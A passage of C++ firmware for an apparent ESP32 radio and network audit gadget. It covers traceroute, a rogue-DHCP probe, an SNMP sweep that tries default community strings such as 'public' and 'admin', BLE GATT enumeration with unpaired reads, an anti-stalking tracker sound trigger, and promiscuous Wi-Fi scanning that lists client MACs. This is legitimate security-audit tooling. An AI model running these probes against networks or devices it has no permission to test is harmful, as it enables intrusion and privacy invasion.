  }
  status = (String("Hop ") + tracerouteTtl + "/" + MAX_HOPS).c_str();
  requestUpdateAndWait();  // paint progress before the blocking ping

  uint32_t ms = 0;
  IPAddress replyFrom(0, 0, 0, 0);
  const bool replied = pingWithTtl(tracerouteTarget, static_cast<uint8_t>(tracerouteTtl), ms, replyFrom);

  char line[48];
  if (!replied) {
    snprintf(line, sizeof(line), "%2d  * (no reply)", tracerouteTtl);
  } else {
    snprintf(line, sizeof(line), "%2d  %s  %ums", tracerouteTtl, replyFrom.toString().c_str(),
             static_cast<unsigned>(ms));
  }
  tracerouteHops.push_back(line);

  const bool reachedTarget = replied && replyFrom == tracerouteTarget;
  tracerouteTtl++;
  if (reachedTarget) {
    finishTraceroute();
    return;
  }
  requestUpdate();
}

void RadioAuditActivity::finishTraceroute() {
  targetTitle = (String("Trace ") + tracerouteTarget.toString()).c_str();
  targetLines = tracerouteHops;
  if (targetLines.empty()) targetLines.push_back("No hops recorded.");
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  status = (String("Hops: ") + static_cast<int>(tracerouteHops.size())).c_str();

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- Rogue DHCP Probe (Network) ---

namespace {
constexpr uint16_t DHCP_CLIENT_PORT = 68;
constexpr uint16_t DHCP_SERVER_PORT = 67;

// Minimal DHCPDISCOVER (RFC 2131): fixed 236-byte BOOTP header + 4-byte magic
// cookie + a short option list. The broadcast flag is set so servers reply via
// broadcast (we have no configured IP of our own in this packet).
std::vector<uint8_t> buildDhcpDiscover(const uint8_t mac[6], uint32_t xid) {
  std::vector<uint8_t> pkt(240, 0);
  pkt[0] = 1;  // op: BOOTREQUEST
  pkt[1] = 1;  // htype: Ethernet
  pkt[2] = 6;  // hlen
  pkt[4] = static_cast<uint8_t>(xid >> 24);
  pkt[5] = static_cast<uint8_t>(xid >> 16);
  pkt[6] = static_cast<uint8_t>(xid >> 8);
  pkt[7] = static_cast<uint8_t>(xid);
  pkt[10] = 0x80;            // flags: broadcast bit
  memcpy(&pkt[28], mac, 6);  // chaddr[16] (28-43): first 6 bytes = client MAC
  pkt[236] = 99;
  pkt[237] = 130;
  pkt[238] = 83;
  pkt[239] = 99;  // magic cookie
  pkt.push_back(53);
  pkt.push_back(1);
  pkt.push_back(1);    // option 53: DHCP Message Type = DISCOVER
  pkt.push_back(255);  // end option
  return pkt;
}
}  // namespace

void RadioAuditActivity::startDhcpProbe() {
  if (WiFi.status() == WL_CONNECTED) {
    doDhcpProbe();
    return;
  }
  shutdownBleController();
  WiFi.mode(WIFI_STA);
  startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                         [this](const ActivityResult& result) {
                           if (result.isCancelled || WiFi.status() != WL_CONNECTED) {
                             status = "Not connected";
                             state = State::DONE;
                             requestUpdate();
                             return;
                           }
                           doDhcpProbe();
                         });
}

void RadioAuditActivity::doDhcpProbe() {
  status = "Probing for DHCP servers...";
  showingTarget = false;
  requestUpdateAndWait();

  targetTitle = "Rogue DHCP Probe";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;

  uint8_t mac[6];
  WiFi.macAddress(mac);
  const uint32_t xid = esp_random();
  const std::vector<uint8_t> discover = buildDhcpDiscover(mac, xid);

  // The device's own WiFi association already holds UDP port 68 for lease
  // renewal; SO_REUSEADDR (set by NetworkUDP::begin) + lwip's SO_REUSE_RXTOALL
  // (enabled in this SDK) let a second listener bind alongside it and still
  // see broadcast replies.
  WiFiUDP udp;
  std::vector<std::string> servers;  // distinct "ip  offers <lease-ip>" lines
  if (!udp.begin(DHCP_CLIENT_PORT)) {
    targetLines.push_back("Could not bind UDP port 68.");
    status = "Probe failed";
  } else {
    udp.beginPacket(IPAddress(255, 255, 255, 255), DHCP_SERVER_PORT);
    udp.write(discover.data(), discover.size());
    udp.endPacket();

    auto buf = makeUniqueNoThrow<uint8_t[]>(512);
    if (buf) {
      const uint32_t deadline = millis() + 3000;
      while (millis() < deadline) {
        const int len = udp.parsePacket();
        if (len > 240) {
          const int n = udp.read(buf.get(), 512);
          // Match our transaction id + the DHCP magic cookie on a BOOTREPLY, so
          // unrelated broadcast traffic on the segment doesn't get counted.
          if (n >= 240 && buf[0] == 2 && buf[4] == static_cast<uint8_t>(xid >> 24) &&
              buf[5] == static_cast<uint8_t>(xid >> 16) && buf[6] == static_cast<uint8_t>(xid >> 8) &&
              buf[7] == static_cast<uint8_t>(xid) && buf[236] == 99 && buf[237] == 130 && buf[238] == 83 &&
              buf[239] == 99) {
            IPAddress serverIp = udp.remoteIP();
            int i = 240;  // scan options for tag 54 (server identifier), preferred over the packet source
            while (i + 1 < n) {
              const uint8_t tag = buf[i];
              if (tag == 255) break;
              if (tag == 0) {
                i++;
                continue;
              }
              const uint8_t optLen = buf[i + 1];
              if (tag == 54 && optLen == 4 && i + 5 < n)
                serverIp = IPAddress(buf[i + 2], buf[i + 3], buf[i + 4], buf[i + 5]);
              i += 2 + optLen;
            }
            char yi[24];
            snprintf(yi, sizeof(yi), "%u.%u.%u.%u", buf[16], buf[17], buf[18], buf[19]);
            const std::string line = std::string(serverIp.toString().c_str()) + "  offers " + yi;
            bool seen = false;
            for (const auto& s : servers)
              if (s == line) {
                seen = true;
                break;
              }
            if (!seen) servers.push_back(line);
          }
        }
        delay(20);
      }
    }
    udp.stop();

    if (servers.empty()) {
      targetLines.push_back("No DHCP servers responded.");
    } else {
      for (const auto& s : servers) targetLines.push_back(s);
      if (servers.size() > 1) {
        targetLines.push_back("");
        targetLines.push_back(std::to_string(servers.size()) + " DIFFERENT servers answered -");
        targetLines.push_back("possible rogue DHCP server on this network.");
      }
    }
    status = (String("DHCP servers: ") + static_cast<int>(servers.size())).c_str();
  }

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

// --- SNMP Sweep (Network) ---

namespace {
constexpr uint16_t SNMP_PORT = 161;
constexpr const char* SNMP_COMMUNITIES[] = {"public", "private", "community", "admin", "manager", "cisco"};
constexpr int SNMP_COMMUNITY_COUNT = sizeof(SNMP_COMMUNITIES) / sizeof(SNMP_COMMUNITIES[0]);

// Short-form BER only (length < 128) -- true for every field in this tiny
// SNMPv1 GetRequest, since community strings/OIDs here are all short.
void berAppendTLV(std::vector<uint8_t>& out, uint8_t tag, const std::vector<uint8_t>& value) {
  out.push_back(tag);
  out.push_back(static_cast<uint8_t>(value.size()));
  out.insert(out.end(), value.begin(), value.end());
}

// SNMPv1 GetRequest for sysDescr.0 (OID 1.3.6.1.2.1.1.1.0) with the given
// community string, used to check whether that community grants read access.
std::vector<uint8_t> buildSnmpGetRequest(const std::string& community, uint8_t requestId) {
  static constexpr uint8_t SYS_DESCR_OID[] = {0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00};

  std::vector<uint8_t> oidTlv, nullTlv, varBind, varBindList;
  berAppendTLV(oidTlv, 0x06, std::vector<uint8_t>(SYS_DESCR_OID, SYS_DESCR_OID + sizeof(SYS_DESCR_OID)));
  berAppendTLV(nullTlv, 0x05, {});
  std::vector<uint8_t> varBindInner(oidTlv);
  varBindInner.insert(varBindInner.end(), nullTlv.begin(), nullTlv.end());
  berAppendTLV(varBind, 0x30, varBindInner);
  berAppendTLV(varBindList, 0x30, varBind);

  std::vector<uint8_t> reqId, errStatus, errIndex, pdu;
  berAppendTLV(reqId, 0x02, {requestId});
  berAppendTLV(errStatus, 0x02, {0x00});
  berAppendTLV(errIndex, 0x02, {0x00});
  std::vector<uint8_t> pduInner(reqId);
  pduInner.insert(pduInner.end(), errStatus.begin(), errStatus.end());
  pduInner.insert(pduInner.end(), errIndex.begin(), errIndex.end());
  pduInner.insert(pduInner.end(), varBindList.begin(), varBindList.end());
  berAppendTLV(pdu, 0xA0, pduInner);  // GetRequest-PDU

  std::vector<uint8_t> version, communityTlv;
  berAppendTLV(version, 0x02, {0x00});
  berAppendTLV(communityTlv, 0x04, std::vector<uint8_t>(community.begin(), community.end()));

  std::vector<uint8_t> body(version);
  body.insert(body.end(), communityTlv.begin(), communityTlv.end());
  body.insert(body.end(), pdu.begin(), pdu.end());

  std::vector<uint8_t> packet;
  berAppendTLV(packet, 0x30, body);  // outer SEQUENCE
  return packet;
}

// Best-effort extraction of the sysDescr OCTET STRING from a GetResponse: scan
// for the first tag-0x04 TLV after the header and take it as ASCII text. Not a
// full BER parser -- just enough to show something readable when it's there.
std::string extractOctetString(const uint8_t* buf, int n) {
  for (int i = 10; i + 1 < n; i++) {
    if (buf[i] == 0x04) {
      const uint8_t len = buf[i + 1];
      if (i + 2 + len <= n && len > 0) {
        std::string s(reinterpret_cast<const char*>(buf + i + 2), len);
        bool printable = true;
        for (char c : s)
          if (c < 0x20 || c > 0x7E) {
            printable = false;
            break;
          }
        if (printable) return s;
      }
    }
  }
  return "";
}
}  // namespace

void RadioAuditActivity::startSnmpSweep() {
  const String prefill = (WiFi.status() == WL_CONNECTED) ? WiFi.gatewayIP().toString() : String("192.168.1.1");
  startActivityForResult(
      std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "Target IP", std::string(prefill.c_str()), 40,
                                              InputType::Url, true),
      [this](const ActivityResult& result) {
        if (result.isCancelled) {
          state = State::DONE;
          requestUpdate();
          return;
        }
        IPAddress ip;
        if (!ip.fromString(std::get<KeyboardResult>(result.data).text.c_str())) {
          status = "Invalid IP";
          state = State::DONE;
          requestUpdate();
          return;
        }
        snmpTarget = ip;
        if (WiFi.status() == WL_CONNECTED) {
          beginSnmpSweep();
          return;
        }
        shutdownBleController();
        WiFi.mode(WIFI_STA);
        startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                               [this](const ActivityResult& r) {
                                 if (r.isCancelled || WiFi.status() != WL_CONNECTED) {
                                   status = "Not connected";
                                   state = State::DONE;
                                   requestUpdate();
                                   return;
                                 }
                                 beginSnmpSweep();
                               });
      });
}

void RadioAuditActivity::beginSnmpSweep() {
  snmpCommunityIdx = 0;
  snmpHits.clear();
  status = "Trying communities...";
  showingTarget = false;
  state = State::SNMP_SWEEP;
  requestUpdate();
}

void RadioAuditActivity::snmpSweepPass() {
  if (snmpCommunityIdx >= SNMP_COMMUNITY_COUNT) {
    finishSnmpSweep();
    return;
  }
  const char* community = SNMP_COMMUNITIES[snmpCommunityIdx];
  status = (String("Trying '") + community + "' (" + (snmpCommunityIdx + 1) + "/" + SNMP_COMMUNITY_COUNT + ")").c_str();
  requestUpdateAndWait();  // paint progress before the blocking UDP round-trip

  const std::vector<uint8_t> req = buildSnmpGetRequest(community, static_cast<uint8_t>(esp_random() & 0xFF));
  WiFiUDP udp;
  if (udp.begin(0)) {  // ephemeral local port
    udp.beginPacket(snmpTarget, SNMP_PORT);
    udp.write(req.data(), req.size());
    udp.endPacket();

    auto buf = makeUniqueNoThrow<uint8_t[]>(512);
    if (buf) {
      const uint32_t deadline = millis() + 700;
      while (millis() < deadline) {
        const int len = udp.parsePacket();
        if (len > 0) {
          const int n = udp.read(buf.get(), 512);
          if (n > 0 && buf[0] == 0x30) {  // any SNMP-shaped reply confirms this community was accepted
            const std::string descr = extractOctetString(buf.get(), n);
            snmpHits.push_back(std::string(community) + (descr.empty() ? "" : ("  sysDescr: " + descr)));
          }
          break;
        }
        delay(20);
      }
    }
    udp.stop();
  }
  snmpCommunityIdx++;
  requestUpdate();
}

void RadioAuditActivity::finishSnmpSweep() {
  targetTitle = (String("SNMP ") + snmpTarget.toString()).c_str();
  targetLines = snmpHits;
  if (targetLines.empty()) targetLines.push_back("No default community accepted.");
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetFromMdnsList = false;
  targetLocatable = false;
  status = (String("Accepted: ") + static_cast<int>(snmpHits.size())).c_str();

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  state = State::DONE;
  requestUpdate();
}

namespace {
// Structured iBeacon/Eddystone breakdown for the BLE deep-scan detail view.
// decodeBleAdvert() (RadioAuditHelpers) already folds these into one summary
// line ("iBeacon <uuid> <major>/<minor>"); this re-parses the same raw bytes
// to show UUID/major/minor or the Eddystone frame fields as separate rows.
void appendBeaconDetail(std::vector<std::string>& lines, const std::string& advType, const std::string& manufacturerHex,
                        const std::string& serviceDataHex) {
  if (advType.rfind("iBeacon", 0) == 0) {
    const std::vector<uint8_t> m = hexToBytes(manufacturerHex);
    if (m.size() >= 25 && m[0] == 0x4C && m[1] == 0x00 && m[2] == 0x02 && m[3] == 0x15) {
      char uuidStr[40];
      snprintf(uuidStr, sizeof(uuidStr), "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X", m[4],
               m[5], m[6], m[7], m[8], m[9], m[10], m[11], m[12], m[13], m[14], m[15], m[16], m[17], m[18], m[19]);
      const uint16_t major = (static_cast<uint16_t>(m[20]) << 8) | m[21];
      const uint16_t minor = (static_cast<uint16_t>(m[22]) << 8) | m[23];
      const int8_t txCal = static_cast<int8_t>(m[24]);
      lines.push_back(std::string("  UUID: ") + uuidStr);
      lines.push_back("  Major: " + std::to_string(major) + "  Minor: " + std::to_string(minor));
      lines.push_back("  TX@1m: " + std::to_string(txCal) + " dBm");
    }
    return;
  }
  if (advType.rfind("Eddystone", 0) == 0) {
    const std::vector<uint8_t> d = hexToBytes(serviceDataHex);
    if (d.empty()) return;
    if (d[0] == 0x10) {  // URL frame: [0x10][tx power][scheme][encoded url...]
      if (d.size() >= 2) lines.push_back("  TX@0m: " + std::to_string(static_cast<int8_t>(d[1])) + " dBm");
      const std::string url = eddystoneUrl(d);
      if (!url.empty()) lines.push_back("  URL: " + url);
    } else if (d[0] == 0x00 && d.size() >= 18) {  // UID frame: [0x00][tx][10B namespace][6B instance]
      lines.push_back("  TX@0m: " + std::to_string(static_cast<int8_t>(d[1])) + " dBm");
      lines.push_back("  Namespace: " + bytesToHex(d.data() + 2, 10));
      lines.push_back("  Instance: " + bytesToHex(d.data() + 12, 6));
    }
  }
}
}  // namespace

#if defined(RADIO_AUDIT_ENABLE_BLE)
void RadioAuditActivity::gattEnumerate() {
  targetMenuOpen = false;
  status = "GATT: connecting...";
  requestUpdateAndWait();

  std::vector<std::string> lines;
  lines.reserve(32);
  lines.push_back("GATT: " + targetLocAddr);

  if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_START) {
    lines.push_back("Low memory - cannot connect.");
  } else {
    if (!bleReady) {
      BLEDevice::init("RadioInk");
      bleReady = true;
    }
    BLEClient* client = BLEDevice::createClient();
    // Bound the connect (default is portMAX_DELAY = block forever, which freezes the
    // device if the peer isn't connectable). type 0xFF keeps the library's auto behavior.
    constexpr uint32_t kConnectTimeoutMs = 8000;
    if (!client) {
      lines.push_back("createClient failed.");
    } else if (!client->connect(BLEAddress(String(targetLocAddr.c_str())), 0xFF, kConnectTimeoutMs)) {
      lines.push_back("Connect failed (not connectable");
      lines.push_back("or out of range).");
    } else {
      std::map<std::string, BLERemoteService*>* services = client->getServices();
      lines.push_back(std::string("Services: ") + std::to_string(services ? services->size() : 0));
      // Security posture: attempt a bounded number of reads on readable characteristics.
      // A read that returns data proves this session needed no PIN/bonding to get it --
      // a factual observation, not a vulnerability verdict (a "no-data" result is
      // ambiguous: could be pairing-gated, or just an empty/unreadable value).
      constexpr int MAX_POSTURE_READS = 6;
      int readsAttempted = 0, readsWithData = 0;
      if (services) {
        for (auto& s : *services) {
          BLERemoteService* svc = s.second;
          lines.push_back(std::string("SVC ") + svc->getUUID().toString().c_str());
          std::map<std::string, BLERemoteCharacteristic*>* chars = svc->getCharacteristics();
          if (chars) {
            for (auto& c : *chars) {
              BLERemoteCharacteristic* ch = c.second;
              std::string props;
              if (ch->canRead()) props += "R";
              if (ch->canWrite()) props += "W";
              if (ch->canNotify()) props += "N";
              if (ch->canIndicate()) props += "I";
              std::string line = std::string("  CH ") + ch->getUUID().toString().c_str() + " [" + props + "]";
              if (ch->canRead() && readsAttempted < MAX_POSTURE_READS) {
                readsAttempted++;
                if (ch->readValue().length() > 0) {
                  readsWithData++;
                  line += "  read OK";
                } else {
                  line += "  no data";
                }
              }
              lines.push_back(line);
            }
          }
        }
      }
      lines.push_back("");
      lines.push_back("Connected + enumerated with no PIN prompt.");
      if (readsAttempted > 0) {
        lines.push_back(std::to_string(readsWithData) + "/" + std::to_string(readsAttempted) +
                        " reads returned data w/o pairing.");
      }
      client->disconnect();
    }
    // Note: not deleting the client (BLEDevice owns peer state; deinit cleans up).
  }
  shutdownBleController();
  WiFi.mode(WIFI_OFF);
  delay(50);

  targetTitle = "GATT dump";
  targetLines = std::move(lines);
  targetScroll = 0;
  targetLocatable = false;
  status = "GATT done";
  showingTarget = true;
  requestUpdate();
}
#endif

#if defined(RADIO_AUDIT_ENABLE_ACTIVE) && defined(RADIO_AUDIT_ENABLE_BLE)
namespace {
// A tracker's control-point replies via indication/notification; we just keep the
// subscription active (some firmware gates the sound on it) and log the response.
void trackerNotifyCb(BLERemoteCharacteristic* c, uint8_t* data, size_t len, bool /*isNotify*/) {
  LOG_INF("AIRTAG", "notify %s len=%u b0=0x%02X", c ? c->getUUID().toString().c_str() : "?",
          static_cast<unsigned>(len), len ? data[0] : 0);
}

// Try one "play sound" protocol on an already-connected client. Returns 1 = command
// written (sound should play), 0 = this protocol's service/char is absent, -1 = present
// but the write was rejected.
int tryTrackerSound(BLEClient* client, const char* svcUuid, const char* chUuid, const uint8_t* cmd, size_t cmdLen,
                    uint32_t holdMs, const char* tag) {
  BLERemoteService* svc = client->getService(BLEUUID(svcUuid));
  if (!svc) return 0;
  BLERemoteCharacteristic* ch = svc->getCharacteristic(BLEUUID(chUuid));
  if (!ch || !ch->canWrite()) return 0;
  // Subscribe to the control point BEFORE writing — trackers gate the sound on an
  // active indication (preferred) or notification subscription.
  if (ch->canIndicate())
    ch->registerForNotify(trackerNotifyCb, false);
  else if (ch->canNotify())
    ch->registerForNotify(trackerNotifyCb, true);
  uint8_t buf[8];
  const size_t n = cmdLen > sizeof(buf) ? sizeof(buf) : cmdLen;
  memcpy(buf, cmd, n);
  const bool ok = ch->writeValue(buf, n, true);  // write with response
  LOG_INF("AIRTAG", "%s write ok=%d ind=%d notif=%d", tag, ok, ch->canIndicate(), ch->canNotify());
  if (!ok) return -1;
  // Hold the link so the tag has time to sound (disconnecting immediately cuts it).
  const uint32_t until = millis() + holdMs;
  while (client->isConnected() && static_cast<int32_t>(until - millis()) > 0) delay(10);
  return 1;
}
}  // namespace

// Anti-stalk: make a nearby separated tracker chirp so it can be found by ear (or stop
// the chirp). Connects to the tag from the detail view and tries each known protocol
// newest-first (DULT unwanted-tracker standard, then FMNA Find My accessory, then legacy
// AirTag), subscribing to the control point and writing the matching start/stop command.
// No pairing/PIN. Only works while the tag is separated from its owner. Legacy AirTag has
// no documented stop, so Stop applies to DULT/FMNA only.
void RadioAuditActivity::playFindMySound(bool stop) {
  const char* verb = stop ? "Stop sound" : "Play sound";
  status = std::string(verb) + ": connecting...";
  requestUpdateAndWait();

  std::vector<std::string> lines;
  lines.reserve(8);
  lines.push_back(std::string(verb) + ": " + targetLocAddr);

  bool sent = false;
  if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_START) {
    lines.push_back("Low memory - cannot connect.");
  } else {
    if (!bleReady) {
      BLEDevice::init("RadioInk");
      bleReady = true;
    }
    BLEClient* client = BLEDevice::createClient();
    // Connect with the ADDRESS TYPE observed in the advert (AirTags use random addrs;
    // hardcoding the type makes the connect silently fail). 15s timeout matches the
    // reference implementation (tags are slow to connect); a bounded timeout also keeps
    // a non-connectable/rotated tag from blocking the loop forever (= a frozen device).
    constexpr uint32_t kConnectTimeoutMs = 15000;
    LOG_INF("AIRTAG", "connect %s type=%u stop=%d", targetLocAddr.c_str(), targetLocAddrType, stop);
    if (!client) {
      lines.push_back("createClient failed.");
    } else if (!client->connect(BLEAddress(String(targetLocAddr.c_str())), targetLocAddrType, kConnectTimeoutMs)) {
      lines.push_back("Connect failed (timeout).");
      lines.push_back("Tag must be SEPARATED from its owner");
      lines.push_back("and in range. The MAC rotates - re-sweep,");
      lines.push_back(std::string("then ") + verb + " right away.");
    } else {
      // Discover all services once, then try each protocol newest-first.
      client->getServices();
      const char* proto = "DULT";
      int r = tryTrackerSound(client, DULT_SOUND_SERVICE, DULT_SOUND_CHAR, stop ? DULT_SOUND_STOP : DULT_SOUND_START,
                              stop ? sizeof(DULT_SOUND_STOP) : sizeof(DULT_SOUND_START), 2500, "DULT");
      if (r == 0) {
        proto = "FMNA";
        r = tryTrackerSound(client, FMNA_SOUND_SERVICE, FMNA_SOUND_CHAR, stop ? FMNA_SOUND_STOP : FMNA_SOUND_START,
                            stop ? sizeof(FMNA_SOUND_STOP) : sizeof(FMNA_SOUND_START), 2500, "FMNA");
      }
      // Legacy AirTag: start only (no documented stop command).
      if (r == 0 && !stop) {
        proto = "AirTag";
        r = tryTrackerSound(client, AIRTAG_SOUND_SERVICE, AIRTAG_SOUND_CHAR, AIRTAG_SOUND_START,
                            sizeof(AIRTAG_SOUND_START), 1500, "AirTag");
      }
      if (r == 1) {
        sent = true;
        lines.push_back(std::string(stop ? "Sound stopped via " : "Sound sent via ") + proto + ".");
        lines.push_back(stop ? "The tag should be silent now." : "The tag should be chirping now.");
      } else if (r == -1) {
        lines.push_back(std::string(proto) + " write rejected (auth/patched).");
      } else {
        lines.push_back(stop ? "Connected, but no stoppable service." : "Connected, but no sound service.");
        lines.push_back(stop ? "(Legacy AirTags have no stop command.)" : "(No DULT/FMNA/AirTag sound char - the");
        if (!stop) lines.push_back("tag may not be in separated mode.)");
      }
      client->disconnect();
    }
    // Note: not deleting the client (BLEDevice owns peer state; deinit cleans up).
  }
  shutdownBleController();
  WiFi.mode(WIFI_OFF);
  delay(50);

  targetTitle = stop ? "Stop Sound" : "Play Sound";
  targetLines = std::move(lines);
  targetScroll = 0;
  targetLocatable = false;
  // Play/Stop Sound is only reachable from the tracker list, so Back from this result
  // returns there (the sound teardown clears the detail's return flags otherwise,
  // which dropped the user all the way out of the menu).
  targetFromList = false;
  targetFromMdnsList = false;
  targetFromCameraList = true;
  showingTarget = true;
  requestUpdate();
}
#endif

void RadioAuditActivity::deepScanWifiTarget(int index) {
  if (index < 0 || index >= static_cast<int>(wifiFindings.size())) return;
  lastDeepScanWifiIndex = index;  // remembered so the detail view can deauth this AP
  targetMenuOpen = false;
  const WifiFinding w = wifiFindings[index];  // copy: vector is rebuilt by scans
  targetTitle = std::string("AP ") + (w.ssid.empty() ? std::string("<hidden>") : w.ssid);
  targetLines.clear();
  targetScroll = 0;
  targetFromList = true;

  uint8_t bssid[6];
  if (!parseBssid(w.bssid, bssid)) {
    targetLines.push_back("Bad BSSID: " + w.bssid);
    status = "Deep scan failed";
    showingTarget = true;
    showingDetails = false;
    requestUpdate();
    return;
  }

  status = "Deep scanning AP...";
  requestUpdateAndWait();

  // Sniff this AP's channel in promiscuous mode for clients + posture.
  prepWifiSta();

  memset(&g_targetCap, 0, sizeof(g_targetCap));
  memcpy(g_targetCap.bssid, bssid, 6);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&targetPromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(static_cast<uint8_t>(w.channel), WIFI_SECOND_CHAN_NONE);

  g_targetCap.active = true;
  delay(TARGET_WIFI_DEEP_MS);
  g_targetCap.active = false;
  esp_wifi_set_promiscuous(false);

  const int samples = g_targetCap.rssiSamples;
  const int avg = samples ? static_cast<int>(g_targetCap.rssiSum / static_cast<long>(samples)) : w.rssi;
  const int lo = samples ? g_targetCap.rssiMin : w.rssi;
  const int hi = samples ? g_targetCap.rssiMax : w.rssi;

  const std::string apVendor = macVendor(w.bssid);
  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back(w.bssid + "  CH" + std::to_string(w.channel) + "  " + w.auth);
  if (!apVendor.empty()) targetLines.push_back("Vendor: " + apVendor);
  targetLines.push_back("RSSI avg " + std::to_string(avg) + " (" + std::to_string(lo) + "/" + std::to_string(hi) +
                        ")  " + std::to_string(samples) + " frames");
  targetLines.push_back("Beacons " + std::to_string(g_targetCap.beaconCount) + "  Data " +
                        std::to_string(g_targetCap.dataFrames) + "  Mgmt " + std::to_string(g_targetCap.mgmtFrames));
  targetLines.push_back(std::string("Privacy ") + (g_targetCap.privacy ? "Y" : "N") + "  PMF " +
                        (g_targetCap.pmf ? "Y" : "N") + "  WPS " + (g_targetCap.wps ? "Y" : "N"));
  if (bssid[0] & 0x02) targetLines.push_back("Randomized BSSID");
  const int attackFrames = g_targetCap.deauthFrames + g_targetCap.disassocFrames;
  if (attackFrames > 0)
    targetLines.push_back("Deauth " + std::to_string(g_targetCap.deauthFrames) + "  Disassoc " +
                          std::to_string(g_targetCap.disassocFrames));
  targetLines.push_back("Clients: " + std::to_string(g_targetCap.clientCount));
  for (uint8_t i = 0; i < g_targetCap.clientCount; i++) {
    const std::string clientMac = macToString(g_targetCap.clients[i]);
    const std::string vendor = macVendor(clientMac);
    targetLines.push_back("  " + clientMac + (vendor.empty() ? "" : ("  " + vendor)));
  }

  // Raise deduplicated audit findings for this AP.
  auto pushFinding = [this, index](const char* severity, const std::string& title, const std::string& detail) {
    for (const auto& f : auditFindings)
      if (f.title == title && f.detail == detail) return;
    AuditFinding f;
    f.severity = severity;
    f.title = title;
    f.detail = detail;
    f.wifiIndex = index;
    auditFindings.push_back(std::move(f));
  };
  const std::string who = w.ssid.empty() ? w.bssid : w.ssid;
  if (g_targetCap.wps) pushFinding("MED", "WPS enabled", who + " exposes WPS (PIN brute-force risk).");
  if (g_targetCap.privacy && !g_targetCap.pmf)
    pushFinding("LOW", "No PMF", who + " lacks 802.11w management frame protection.");
  if (g_targetCap.clientCount > 0)
    pushFinding("INFO", "Active clients",
                who + " has " + std::to_string(g_targetCap.clientCount) + " associated client(s).");
  if (attackFrames >= 5)
    pushFinding("HIGH", "Possible deauth activity",
                who + " saw " + std::to_string(attackFrames) + " deauth/disassoc frames (possible attack/evil twin).");

  // Return the radio to the idle (off) state the activity expects.
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);

  targetLocatable = true;
  targetLocBle = false;
  memcpy(targetLocBssid, bssid, 6);
  targetLocChannel = w.channel;
  targetLocName = targetTitle;

  status = std::string("Deep AP done, ") + std::to_string(g_targetCap.clientCount) + " clients";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

#if defined(RADIO_AUDIT_ENABLE_BLE)
namespace {
// Streaming collector for the per-target deep scan. Mirrors StreamingScanCb's
// erase-as-you-go discipline (each advert is removed from the result map right
// after it is seen) so NimBLE's map can't grow unbounded -- the old accumulating
// start()+getDevice() loop bad_alloc'd -> abort()ed here in a dense beacon
// environment (confirmed via crash_report.txt). Only the target's adverts update
// the stats; every other advert is still erased to keep peak memory at one device.
class TargetDeepScanCb : public BLEAdvertisedDeviceCallbacks {
 public:
  BLEScan* scan = nullptr;
  std::string targetAddr;

  int rssiMin = 0, rssiMax = 0, samples = 0;
  long rssiSum = 0;
  std::string name, manufacturer, services, serviceDataUuid, serviceDataHex;
  bool hasTxPower = false;
  int txPower = 0;
  int addressType = -1;

  void onResult(BLEAdvertisedDevice dev) override {
    if (std::string(dev.getAddress().toString().c_str()) == targetAddr) {
      const int r = dev.getRSSI();
      rssiSum += r;
      if (samples == 0) {
        rssiMin = r;
        rssiMax = r;
      } else {
        rssiMin = std::min(rssiMin, r);
        rssiMax = std::max(rssiMax, r);
      }
      samples++;
      if (name.empty() && dev.haveName()) name = dev.getName().c_str();
      if (manufacturer.empty() && dev.haveManufacturerData())
        manufacturer = hexEncode(dev.getManufacturerData()).c_str();
      if (services.empty() && dev.haveServiceUUID()) services = dev.getServiceUUID().toString().c_str();
      if (serviceDataHex.empty() && dev.haveServiceData()) {
        serviceDataUuid = dev.getServiceDataUUID().toString().c_str();
        serviceDataHex = hexEncode(dev.getServiceData()).c_str();
      }
      if (dev.haveTXPower()) {
        hasTxPower = true;
        txPower = dev.getTXPower();
      }
      addressType = dev.getAddressType();
    }
    if (scan) scan->erase(dev.getAddress());
  }
};
}  // namespace
#endif

void RadioAuditActivity::deepScanBleTarget(int index) {
  if (index < 0 || index >= static_cast<int>(bleFindings.size())) return;
  targetTitle =
      std::string("BLE ") + (bleFindings[index].name.empty() ? bleFindings[index].address : bleFindings[index].name);
  targetLines.clear();
  targetScroll = 0;
  targetFromList = true;

#if defined(RADIO_AUDIT_ENABLE_BLE)
  const std::string address = bleFindings[index].address;

  status = "Deep scanning device...";
  requestUpdateAndWait();

  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(200);  // let WiFi fully release before the BLE controller starts (C3 is memory-tight)

  if (!bleReady) {
    // Heap headroom going into controller init. Floor is BLE_HEAP_FLOOR_START (50 KB);
    // init itself eats ~65 KB, so a value near/below the floor predicts an init failure.
    LOG_INF("RADIO", "BLE deep-dive pre-init free heap: %u (floor %u)", static_cast<unsigned>(ESP.getFreeHeap()),
